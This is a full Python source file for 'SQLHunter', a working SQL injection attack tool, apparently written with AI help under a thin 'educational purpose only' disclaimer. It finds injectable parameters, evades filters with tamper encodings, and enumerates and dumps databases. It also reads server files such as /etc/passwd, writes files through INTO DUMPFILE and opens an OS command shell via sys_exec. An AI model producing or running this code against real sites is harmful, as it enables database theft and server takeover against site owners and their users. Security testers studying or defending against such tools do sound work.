#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLHunter 2026 Advanced Edition - Full-Featured SQL Injection Tool
Educational Purpose Only - Use on Authorized Systems
Author: AI Assistant for Learning
Version: 3.0 Advanced
"""

import requests
import sys
import time
import re
import string
import random
import argparse
import json
import os
import base64
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

# ========== ANSI COLORS ==========
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_PURPLE = '\033[45m'
    BG_CYAN = '\033[46m'

# ========== BANNER ==========
BANNER = f"""
{Colors.CYAN}{Colors.BOLD}
   ███████╗ ██████╗ ██╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
   ██╔════╝██╔═══██╗██║     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
   ███████╗██║   ██║██║     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
   ╚════██║██║▄▄ ██║██║     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
   ███████║╚██████╔╝███████╗██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
   ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{Colors.RESET}
{Colors.YELLOW}{Colors.BOLD}  ⚡ SQLHunter 2026 Advanced  v.1 ⚡{Colors.RESET}
{Colors.GREEN}   Automated SQL Injection Testing Tool{Colors.RESET}
{Colors.RED}{Colors.BOLD}  ⚠️  មួយៗ!{Colors.RESET}
"""

# ========== LOGGING FUNCTIONS ==========
def log_info(msg):
    print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")

def log_success(msg):
    print(f"{Colors.GREEN}[✓]{Colors.RESET} {msg}")

def log_error(msg):
    print(f"{Colors.RED}[✗]{Colors.RESET} {msg}")

def log_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")

def log_payload(msg):
    print(f"{Colors.PURPLE}[>]{Colors.RESET} {msg}")

def log_debug(msg):
    print(f"{Colors.DIM}[~]{Colors.RESET} {msg}")

def log_critical(msg):
    print(f"{Colors.BG_RED}{Colors.WHITE}[!!!] {msg}{Colors.RESET}")

def progress_bar(current, total, prefix="Progress"):
    """Display a progress bar"""
    bar_length = 40
    filled = int(bar_length * current / total)
    bar = '█' * filled + '░' * (bar_length - filled)
    percent = (current / total) * 100
    sys.stdout.write(f'\r{Colors.CYAN}{prefix}:{Colors.RESET} |{Colors.GREEN}{bar}{Colors.RESET}| {percent:.1f}% ')
    sys.stdout.flush()
    if current == total:
        print()

# ========== CONFIGURATION ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
]

TIMEOUT = 15
MAX_THREADS = 10
DELAY = 0.1
OUTPUT_DIR = "SQLHunter_Reports"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ========== TAMPER SCRIPTS ==========
class TamperScripts:
    @staticmethod
    def space2comment(payload):
        """Replace spaces with comments"""
        return payload.replace(" ", "/**/")
    
    @staticmethod
    def space2plus(payload):
        """Replace spaces with plus sign"""
        return payload.replace(" ", "+")
    
    @staticmethod
    def random_case(payload):
        """Randomize case of keywords"""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'SLEEP', 'ORDER', 'BY']
        result = payload
        for kw in keywords:
            randomized = ''.join(random.choice([c.upper(), c.lower()]) for c in kw)
            result = re.sub(kw, randomized, result, flags=re.IGNORECASE)
        return result
    
    @staticmethod
    def double_url_encode(payload):
        """Double URL encode the payload"""
        return quote(quote(payload))
    
    @staticmethod
    def hex_encode(payload):
        """Convert to hex where possible"""
        # Simple implementation - converts single quotes
        return payload.replace("'", "0x27")
    
    @staticmethod
    def unicode_encode(payload):
        """Unicode encode special characters"""
        payload = payload.replace("'", "%EF%BC%87")
        payload = payload.replace('"', "%EF%BC%82")
        payload = payload.replace(" ", "%EF%BC%90")
        return payload

TAMPERS = {
    "space2comment": TamperScripts.space2comment,
    "space2plus": TamperScripts.space2plus,
    "random_case": TamperScripts.random_case,
    "double_encode": TamperScripts.double_url_encode,
    "hex_encode": TamperScripts.hex_encode,
    "unicode": TamperScripts.unicode_encode,
}

# ========== HELPER FUNCTIONS ==========
def rand_agent():
    return random.choice(USER_AGENTS)

def make_request(url, method="GET", data=None, headers=None, cookies=None):
    """Make HTTP request with proper error handling"""
    if headers is None:
        headers = {
            "User-Agent": rand_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }
    
    try:
        if method.upper() == "GET":
            resp = requests.get(url, headers=headers, cookies=cookies, 
                              timeout=TIMEOUT, allow_redirects=False, verify=False)
        else:
            resp = requests.post(url, data=data, headers=headers, cookies=cookies,
                               timeout=TIMEOUT, allow_redirects=False, verify=False)
        return resp
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.ConnectionError:
        return None
    except Exception as e:
        return None

def save_report(data, filename):
    """Save report to JSON file"""
    filepath = os.path.join(OUTPUT_DIR, filename)
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    log_success(f"Report saved to {filepath}")

# ========== MAIN SQLHUNTER CLASS ==========
class SQLHunter:
    def __init__(self, url, param, method="GET", data=None, tamper=None, headers=None, cookies=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data
        self.tamper = tamper
        self.custom_headers = headers
        self.cookies = cookies
        self.vulnerable = False
        self.technique = None
        self.dbms = "Unknown"
        self.col_count = 0
        self.visible_col = 0
        self.injected_payload = ""
        self.orig_value = self._get_original_value()
        self.base_resp = self._send(self.orig_value)
        self.base_len = len(self.base_resp.text) if self.base_resp else 0
        self.base_time = 0
        self.session_start = time.time()

    def _get_original_value(self):
        """Extract original parameter value"""
        if self.method == "GET":
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            return params.get(self.param, ['1'])[0]
        else:
            if isinstance(self.data, str):
                try:
                    data_dict = dict(parse_qs(self.data))
                    return data_dict.get(self.param, ['1'])[0]
                except:
                    return '1'
            elif isinstance(self.data, dict):
                return str(self.data.get(self.param, '1'))
            return '1'

    def _apply_tamper(self, payload):
        """Apply tamper script if specified"""
        if self.tamper and self.tamper in TAMPERS:
            return TAMPERS[self.tamper](payload)
        return payload

    def _build_payload(self, injection):
        """Build final injection payload"""
        return self.orig_value + injection

    def _send(self, injection, use_tamper=True):
        """Send request with injection"""
        payload = self._build_payload(injection)
        if use_tamper and self.tamper:
            payload = self._apply_tamper(payload)
        
        log_payload(f"Testing: {payload[:100]}...")
        
        if self.method == "GET":
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            params[self.param] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            return make_request(test_url, "GET", headers=self.custom_headers, cookies=self.cookies)
        else:
            new_data = self.data.copy() if isinstance(self.data, dict) else self.data
            if isinstance(new_data, dict):
                new_data[self.param] = payload
            return make_request(self.url, "POST", data=new_data, headers=self.custom_headers, cookies=self.cookies)

    # ========== DETECTION METHODS ==========
    def detect_error_based(self):
        """Detect error-based SQL injection"""
        log_info("Testing Error-based SQL Injection...")
        payloads = [
            "'", "\"", "')", "\")", "1'", "1\"", "')-- -", "\")-- -",
            "' OR '1'='1", "\" OR \"1\"=\"1",
            "' AND 1=1-- -", "' AND 1=2-- -"
        ]
        errors = [
            r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
            r"valid MySQL result", r"PostgreSQL.*ERROR", r"Warning.*\Wpg_",
            r"Oracle.*Driver", r"SQLite.*Exception", r"Microsoft OLE DB",
            r"ODBC Driver", r"Unclosed quotation mark", r"SQL command not properly ended",
            r"you have an error in your SQL syntax"
        ]
        
        for pl in payloads:
            resp = self._send(pl)
            if resp:
                content = resp.text
                # Check for SQL errors
                for err in errors:
                    if re.search(err, content, re.IGNORECASE):
                        log_success(f"Error-based SQLi found with payload: {pl}")
                        self.technique = "Error-based"
                        self.vulnerable = True
                        self.injected_payload = pl
                        return True
                # Check for 500 status
                if resp.status_code == 500:
                    log_success(f"Error-based SQLi (500) with payload: {pl}")
                    self.technique = "Error-based"
                    self.vulnerable = True
                    self.injected_payload = pl
                    return True
            time.sleep(DELAY)
        return False

    def detect_boolean_blind(self):
        """Detect boolean-based blind SQL injection"""
        log_info("Testing Boolean-based Blind SQL Injection...")
        true_payload = " AND 1=1-- -"
        false_payload = " AND 1=2-- -"
        
        resp_true = self._send(true_payload)
        resp_false = self._send(false_payload)
        
        if resp_true and resp_false:
            len_true = len(resp_true.text)
            len_false = len(resp_false.text)
            
            if abs(len_true - len_false) > 50:
                log_success(f"Boolean-based blind SQLi found (length diff: {abs(len_true - len_false)})")
                self.technique = "Boolean-based blind"
                self.vulnerable = True
                return True
            
            # Check for content differences
            if resp_true.text != resp_false.text:
                log_success("Boolean-based blind SQLi found (content differs)")
                self.technique = "Boolean-based blind"
                self.vulnerable = True
                return True
        return False

    def detect_time_blind(self):
        """Detect time-based blind SQL injection"""
        log_info("Testing Time-based Blind SQL Injection...")
        payloads = [
            (" AND SLEEP(5)-- -", 4.5),
            ("' AND SLEEP(5)-- -", 4.5),
            ('" AND SLEEP(5)-- -', 4.5),
            (" AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", 4.5),
            ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", 4.5),
        ]
        
        for pl, threshold in payloads:
            start = time.time()
            resp = self._send(pl)
            elapsed = time.time() - start
            
            if elapsed >= threshold:
                log_success(f"Time-based blind SQLi found ({elapsed:.2f}s) with: {pl}")
                self.technique = "Time-based blind"
                self.vulnerable = True
                self.injected_payload = pl
                return True
            time.sleep(DELAY)
        return False

    def detect_stacked_queries(self):
        """Detect stacked queries"""
        log_info("Testing Stacked Queries...")
        payloads = [
            "; SELECT SLEEP(2)-- -",
            "'; SELECT SLEEP(2)-- -",
            '"; SELECT SLEEP(2)-- -',
        ]
        
        for pl in payloads:
            start = time.time()
            resp = self._send(pl)
            elapsed = time.time() - start
            
            if elapsed > 1.5:
                log_success("Stacked queries possible!")
                self.technique = "Stacked queries"
                self.vulnerable = True
                return True
            time.sleep(DELAY)
        return False

    def detect_union(self):
        """Detect UNION-based SQL injection"""
        log_info("Testing UNION-based SQL Injection...")
        
        # Find number of columns
        for i in range(1, 30):
            pl = f" ORDER BY {i}-- -"
            resp = self._send(pl)
            if resp and (resp.status_code == 500 or len(resp.text) != self.base_len):
                self.col_count = i - 1
                break
            time.sleep(0.05)
        
        if self.col_count == 0:
            return False
        
        log_info(f"Found {self.col_count} columns")
        
        # Find visible columns
        for i in range(1, self.col_count + 1):
            nulls = ["NULL"] * self.col_count
            nulls[i - 1] = "CONCAT('SQLHUNTER','TEST','SQLHUNTER')"
            pl = f" UNION SELECT {','.join(nulls)}-- -"
            resp = self._send(pl)
            if resp and "SQLHUNTERTESTSQLHUNTER" in resp.text:
                self.visible_col = i
                log_success(f"UNION-based SQLi found! Visible column: {i}")
                self.technique = "UNION query"
                self.vulnerable = True
                return True
            time.sleep(0.05)
        
        # Try with different NULL patterns
        for i in range(1, self.col_count + 1):
            nulls = ["NULL"] * self.col_count
            nulls[i - 1] = "'SQLHUNTER'"
            pl = f" UNION SELECT {','.join(nulls)}-- -"
            resp = self._send(pl)
            if resp and "SQLHUNTER" in resp.text:
                self.visible_col = i
                log_success(f"UNION-based SQLi found! Visible column: {i}")
                self.technique = "UNION query"
                self.vulnerable = True
                return True
            time.sleep(0.05)
        
        return False

    def run_detection(self):
        """Run all detection techniques"""
        log_info(f"Testing parameter: {Colors.YELLOW}{self.param}{Colors.RESET}")
        
        techniques = [
            self.detect_error_based,
            self.detect_boolean_blind,
            self.detect_time_blind,
            self.detect_stacked_queries,
            self.detect_union
        ]
        
        for technique in techniques:
            if technique():
                return True
        
        log_error("No SQL injection vulnerability found")
        return False

    # ========== UNION-BASED EXPLOITATION ==========
    def union_query(self, query):
        """Execute a query via UNION and return result"""
        if not self.visible_col:
            return None
        
        nulls = ["NULL"] * self.col_count
        nulls[self.visible_col - 1] = f"CONCAT(0x53514C48554E544552,({query}),0x53514C48554E544552)"
        pl = f" UNION SELECT {','.join(nulls)}-- -"
        resp = self._send(pl)
        
        if resp:
            match = re.search(r'SQLHUNTER(.*?)SQLHUNTER', resp.text, re.DOTALL)
            if match:
                return match.group(1)
        return None

    def get_dbms_info(self):
        """Get database information"""
        info = {}
        queries = {
            "version": "VERSION()",
            "user": "USER()",
            "database": "DATABASE()",
            "hostname": "@@hostname",
            "datadir": "@@datadir"
        }
        
        for key, query in queries.items():
            result = self.union_query(query)
            if result:
                info[key] = result
                log_success(f"{key}: {result}")
            time.sleep(DELAY)
        
        return info

    def get_databases(self):
        """Enumerate all databases"""
        databases = []
        for i in range(100):
            query = f"SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {i}"
            db = self.union_query(query)
            if db and db.strip():
                databases.append(db.strip())
                log_success(f"Database: {db.strip()}")
            else:
                break
            time.sleep(DELAY)
        return databases

    def get_tables(self, database):
        """Enumerate tables in a database"""
        tables = []
        for i in range(1000):
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT 1 OFFSET {i}"
            table = self.union_query(query)
            if table and table.strip():
                tables.append(table.strip())
            else:
                break
            time.sleep(DELAY)
        return tables

    def get_columns(self, database, table):
        """Enumerate columns in a table"""
        columns = []
        for i in range(1000):
            query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT 1 OFFSET {i}"
            col = self.union_query(query)
            if col and col.strip():
                columns.append(col.strip())
            else:
                break
            time.sleep(DELAY)
        return columns

    def dump_table(self, database, table, columns, limit=1000):
        """Dump table contents"""
        rows = []
        concat_cols = ",'|',".join([f"IFNULL({col},'NULL')" for col in columns])
        
        for i in range(limit):
            query = f"SELECT CONCAT({concat_cols}) FROM {database}.{table} LIMIT 1 OFFSET {i}"
            row = self.union_query(query)
            if row and row.strip():
                rows.append(row.strip().split('|'))
                progress_bar(i + 1, limit, f"Dumping {table}")
            else:
                break
            time.sleep(DELAY)
        
        return rows

    # ========== BLIND SQLI EXPLOITATION ==========
    def blind_check_true(self, condition, technique="boolean"):
        """Check if a condition is true using blind technique"""
        if technique == "boolean":
            pl = f" AND ({condition})-- -"
            resp = self._send(pl)
            return resp and len(resp.text) == self.base_len
        elif technique == "time":
            pl = f" AND IF(({condition}), SLEEP(1), 0)-- -"
            start = time.time()
            self._send(pl)
            return (time.time() - start) > 0.8

    def blind_get_length(self, query, technique="boolean"):
        """Get length of query result using binary search"""
        log_info(f"Getting length of query result...")
        
        low, high = 1, 1000
        while low < high:
            mid = (low + high) // 2
            if self.blind_check_true(f"LENGTH(({query}))>{mid}", technique):
                low = mid + 1
            else:
                high = mid
            time.sleep(DELAY)
        
        log_success(f"Length: {low}")
        return low

    def blind_extract_char(self, query, position, technique="boolean"):
        """Extract character at position using binary search"""
        low, high = 32, 126
        
        while low < high:
            mid = (low + high + 1) // 2
            condition = f"ASCII(SUBSTRING(({query}),{position},1))>={mid}"
            if self.blind_check_true(condition, technique):
                low = mid
            else:
                high = mid - 1
            time.sleep(DELAY * 0.5)
        
        return chr(low)

    def blind_extract_string(self, query, technique="boolean"):
        """Extract complete string result"""
        length = self.blind_get_length(query, technique)
        if length == 0:
            return ""
        
        result = ""
        log_info("Extracting data...")
        
        for i in range(1, length + 1):
            char = self.blind_extract_char(query, i, technique)
            result += char
            progress_bar(i, length, "Blind Extraction")
            time.sleep(DELAY)
        
        print()  # New line
        log_success(f"Extracted: {result}")
        return result

    def blind_get_databases(self, technique="boolean"):
        """Enumerate databases using blind technique"""
        databases = []
        for i in range(20):
            query = f"SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {i}"
            db = self.blind_extract_string(query, technique)
            if db and db.strip():
                databases.append(db.strip())
                log_success(f"Found database: {db.strip()}")
            else:
                break
        return databases

    def blind_get_tables(self, database, technique="boolean"):
        """Enumerate tables using blind technique"""
        tables = []
        for i in range(100):
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT 1 OFFSET {i}"
            table = self.blind_extract_string(query, technique)
            if table and table.strip():
                tables.append(table.strip())
                log_success(f"Found table: {table.strip()}")
            else:
                break
        return tables

    def blind_get_columns(self, database, table, technique="boolean"):
        """Enumerate columns using blind technique"""
        columns = []
        for i in range(100):
            query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT 1 OFFSET {i}"
            col = self.blind_extract_string(query, technique)
            if col and col.strip():
                columns.append(col.strip())
                log_success(f"Found column: {col.strip()}")
            else:
                break
        return columns

    def blind_dump_column(self, database, table, column, technique="boolean", limit=50):
        """Dump a single column using blind technique"""
        data = []
        for i in range(limit):
            query = f"SELECT {column} FROM {database}.{table} LIMIT 1 OFFSET {i}"
            value = self.blind_extract_string(query, technique)
            if value:
                data.append(value)
            else:
                break
        return data

    # ========== FILE OPERATIONS ==========
    def read_file(self, filepath):
        """Read file from server (requires FILE privilege)"""
        query = f"SELECT LOAD_FILE('{filepath}')"
        content = self.union_query(query)
        return content

    def write_file(self, filepath, content):
        """Write file to server (requires FILE privilege)"""
        hex_content = content.encode().hex()
        query = f"SELECT 0x{hex_content} INTO DUMPFILE '{filepath}'"
        self.union_query(query)
        log_warning(f"Attempted to write {filepath}")

    # ========== OS COMMAND EXECUTION ==========
    def execute_command(self, command):
        """Execute OS command (requires sys_exec UDF or xp_cmdshell)"""
        # Try MySQL sys_exec
        query = f"SELECT sys_exec('{command}')"
        result = self.union_query(query)
        if result:
            return result
        
        # Try MySQL do_system
        query = f"SELECT do_system('{command}')"
        result = self.union_query(query)
        return result

# ========== INTERACTIVE SHELL ==========
def interactive_shell(hunter):
    """Interactive exploitation shell"""
    technique = "boolean"
    if hunter.technique and "Time" in hunter.technique:
        technique = "time"
    
    while True:
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}SQLHunter Interactive Shell{Colors.RESET}")
        print(f"{Colors.GREEN}Technique: {hunter.technique}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.YELLOW}1.{Colors.RESET} Database Enumeration")
        print(f"{Colors.YELLOW}2.{Colors.RESET} Table Enumeration")
        print(f"{Colors.YELLOW}3.{Colors.RESET} Column Enumeration")
        print(f"{Colors.YELLOW}4.{Colors.RESET} Data Dump")
        print(f"{Colors.YELLOW}5.{Colors.RESET} Custom SQL Query")
        print(f"{Colors.YELLOW}6.{Colors.RESET} File Operations")
        print(f"{Colors.YELLOW}7.{Colors.RESET} OS Command Execution")
        print(f"{Colors.YELLOW}8.{Colors.RESET} Switch Technique")
        print(f"{Colors.YELLOW}9.{Colors.RESET} Save Report")
        print(f"{Colors.YELLOW}0.{Colors.RESET} Exit")
        
        choice = input(f"\n{Colors.BOLD}SQLHunter > {Colors.RESET}").strip()
        
        if choice == "1":
            # Database enumeration
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                dbs = hunter.get_databases()
            else:
                dbs = hunter.blind_get_databases(technique)
            
            print(f"\n{Colors.GREEN}Databases Found:{Colors.RESET}")
            for db in dbs:
                print(f"  📁 {db}")
        
        elif choice == "2":
            # Table enumeration
            db_name = input(f"{Colors.YELLOW}Database name: {Colors.RESET}").strip()
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                tables = hunter.get_tables(db_name)
            else:
                tables = hunter.blind_get_tables(db_name, technique)
            
            print(f"\n{Colors.GREEN}Tables in {db_name}:{Colors.RESET}")
            for table in tables:
                print(f"  📊 {table}")
        
        elif choice == "3":
            # Column enumeration
            db_name = input(f"{Colors.YELLOW}Database name: {Colors.RESET}").strip()
            table_name = input(f"{Colors.YELLOW}Table name: {Colors.RESET}").strip()
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                columns = hunter.get_columns(db_name, table_name)
            else:
                columns = hunter.blind_get_columns(db_name, table_name, technique)
            
            print(f"\n{Colors.GREEN}Columns in {table_name}:{Colors.RESET}")
            for col in columns:
                print(f"  📋 {col}")
        
        elif choice == "4":
            # Data dump
            db_name = input(f"{Colors.YELLOW}Database name: {Colors.RESET}").strip()
            table_name = input(f"{Colors.YELLOW}Table name: {Colors.RESET}").strip()
            
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                columns = hunter.get_columns(db_name, table_name)
                if columns:
                    print(f"\n{Colors.CYAN}Dumping data from {db_name}.{table_name}...{Colors.RESET}")
                    data = hunter.dump_table(db_name, table_name, columns)
                    print(f"\n{Colors.GREEN}Data:{Colors.RESET}")
                    print(f"{Colors.BOLD}{' | '.join(columns)}{Colors.RESET}")
                    print("-" * 50)
                    for row in data:
                        print(" | ".join(row))
            else:
                columns = hunter.blind_get_columns(db_name, table_name, technique)
                for col in columns:
                    print(f"\n{Colors.CYAN}Column: {col}{Colors.RESET}")
                    data = hunter.blind_dump_column(db_name, table_name, col, technique)
                    for value in data:
                        print(f"  {value}")
        
        elif choice == "5":
            # Custom query
            query = input(f"{Colors.YELLOW}SQL Query: {Colors.RESET}").strip()
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                result = hunter.union_query(query)
            else:
                result = hunter.blind_extract_string(query, technique)
            print(f"{Colors.GREEN}Result: {Colors.RESET}{result}")
        
        elif choice == "6":
            # File operations
            print(f"\n{Colors.YELLOW}1.{Colors.RESET} Read File")
            print(f"{Colors.YELLOW}2.{Colors.RESET} Write File")
            file_choice = input(f"{Colors.BOLD}Choice: {Colors.RESET}").strip()
            
            if file_choice == "1":
                filepath = input(f"{Colors.YELLOW}File path: {Colors.RESET}").strip()
                content = hunter.read_file(filepath)
                if content:
                    print(f"\n{Colors.GREEN}File contents:{Colors.RESET}\n{content}")
                else:
                    log_error("Failed to read file (may require FILE privilege)")
            elif file_choice == "2":
                filepath = input(f"{Colors.YELLOW}Destination path: {Colors.RESET}").strip()
                content = input(f"{Colors.YELLOW}Content: {Colors.RESET}").strip()
                hunter.write_file(filepath, content)
        
        elif choice == "7":
            # OS Command execution
            print(f"\n{Colors.RED}OS Shell (type 'exit' to quit){Colors.RESET}")
            while True:
                cmd = input(f"{Colors.RED}os-shell> {Colors.RESET}").strip()
                if cmd.lower() in ['exit', 'quit']:
                    break
                result = hunter.execute_command(cmd)
                if result:
                    print(result)
                else:
                    log_error("Command failed or sys_exec not available")
        
        elif choice == "8":
            # Switch technique
            technique = "time" if technique == "boolean" else "boolean"
            log_info(f"Switched to {technique}-based extraction")
        
        elif choice == "9":
            # Save report
            report = {
                "target": hunter.url,
                "parameter": hunter.param,
                "technique": hunter.technique,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            filename = f"report_{time.strftime('%Y%m%d_%H%M%S')}.json"
            save_report(report, filename)
        
        elif choice == "0":
            log_info("Exiting SQLHunter...")
            break
        
        else:
            log_error("Invalid option!")

# ========== MAIN FUNCTION ==========
def main():
    parser = argparse.ArgumentParser(
        description=f"{Colors.CYAN}SQLHunter 2026 Advanced Edition{Colors.RESET}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.YELLOW}Examples:{Colors.RESET}
  {Colors.GREEN}Basic scan:{Colors.RESET}
    python sqlhunter.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
  
  {Colors.GREEN}POST data scan:{Colors.RESET}
    python sqlhunter.py -u "http://example.com/login.php" --data "user=admin&pass=123" -p user
  
  {Colors.GREEN}Dump database:{Colors.RESET}
    python sqlhunter.py -u "http://target.com/page.php?id=1" --dump
  
  {Colors.GREEN}Read file:{Colors.RESET}
    python sqlhunter.py -u "http://target.com/page.php?id=1" --file-read "/etc/passwd"
  
  {Colors.GREEN}OS Shell:{Colors.RESET}
    python sqlhunter.py -u "http://target.com/page.php?id=1" --os-shell
  
  {Colors.GREEN}Use tamper:{Colors.RESET}
    python sqlhunter.py -u "http://target.com/page.php?id=1" --tamper space2comment
        """
    )
    
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", help="Parameter to test")
    parser.add_argument("--data", help="POST data (e.g., 'user=admin&pass=123')")
    parser.add_argument("--dump", action="store_true", help="Auto-dump database")
    parser.add_argument("--file-read", help="Read file from server")
    parser.add_argument("--file-write", nargs=2, metavar=('PATH', 'CONTENT'), help="Write file to server")
    parser.add_argument("--os-shell", action="store_true", help="Get interactive OS shell")
    parser.add_argument("--tamper", choices=TAMPERS.keys(), help="Tamper script to use")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("--threads", type=int, default=MAX_THREADS, help="Number of threads")
    parser.add_argument("--batch", action="store_true", help="Non-interactive mode")
    
    args = parser.parse_args()
    
    # URL validation
    if not args.url.startswith("http"):
        args.url = "http://" + args.url
    
    # Parse cookies
    cookies = {}
    if args.cookie:
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                cookies[key] = value
    
    # Print banner
    print(BANNER)
    
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Parse parameters
    params = []
    if args.param:
        params.append(args.param)
    else:
        if args.data:
            try:
                post_params = parse_qs(args.data)
                params = list(post_params.keys())
            except:
                log_error("Invalid POST data format")
                sys.exit(1)
        else:
            parsed = urlparse(args.url)
            query_params = parse_qs(parsed.query)
            params = list(query_params.keys())
    
    if not params:
        log_error("No parameters found. Use -p or provide URL with query string.")
        sys.exit(1)
    
    log_info(f"Target URL: {Colors.WHITE}{args.url}{Colors.RESET}")
    log_info(f"Parameters found: {Colors.YELLOW}{', '.join(params)}{Colors.RESET}")
    
    # Process each parameter
    for param in params:
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        log_info(f"Testing parameter: {Colors.YELLOW}{param}{Colors.RESET}")
        
        hunter = SQLHunter(
            url=args.url,
            param=param,
            method="POST" if args.data else "GET",
            data=args.data,
            tamper=args.tamper,
            cookies=cookies
        )
        
        if not hunter.run_detection():
            continue
        
        log_success(f"Vulnerable! Technique: {Colors.GREEN}{hunter.technique}{Colors.RESET}")
        
        # Auto-dump if requested
        if args.dump and hunter.technique in ["UNION query", "Error-based"]:
            info = hunter.get_dbms_info()
            if info and 'database' in info:
                tables = hunter.get_tables(info['database'])
                if tables:
                    log_success(f"Found {len(tables)} tables")
                    for table in tables[:5]:  # Dump first 5 tables
                        columns = hunter.get_columns(info['database'], table)
                        if columns:
                            data = hunter.dump_table(info['database'], table, columns, limit=10)
                            print(f"\n{Colors.GREEN}Table: {table}{Colors.RESET}")
                            print(f"{Colors.BOLD}{' | '.join(columns)}{Colors.RESET}")
                            for row in data:
                                print(" | ".join(row))
        
        # File read if requested
        if args.file_read and hunter.technique in ["UNION query", "Error-based"]:
            content = hunter.read_file(args.file_read)
            if content:
                print(f"\n{Colors.GREEN}File: {args.file_read}{Colors.RESET}")
                print(content)
        
        # File write if requested
        if args.file_write and hunter.technique in ["UNION query", "Error-based"]:
            filepath, content = args.file_write
            hunter.write_file(filepath, content)
        
        # OS Shell if requested
        if args.os_shell:
            print(f"\n{Colors.RED}{Colors.BOLD}OS Shell Mode{Colors.RESET}")
            print(f"{Colors.YELLOW}Type commands or 'exit' to quit{Colors.RESET}")
            while True:
                try:
                    cmd = input(f"{Colors.RED}os-shell> {Colors.RESET}").strip()
                    if cmd.lower() in ['exit', 'quit']:
                        break
                    result = hunter.execute_command(cmd)
                    if result:
                        print(result)
                    else:
                        log_error("Command failed")
                except KeyboardInterrupt:
                    break
        
        # Interactive mode
        if not args.batch and not args.os_shell:
            print(f"\n{Colors.YELLOW}Starting interactive shell...{Colors.RESET}")
            interactive_shell(hunter)
    
    log_success("Scan completed!")
    log_info(f"Reports saved in: {OUTPUT_DIR}/")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        log_critical(f"Unexpected error: {e}")
        sys.exit(1)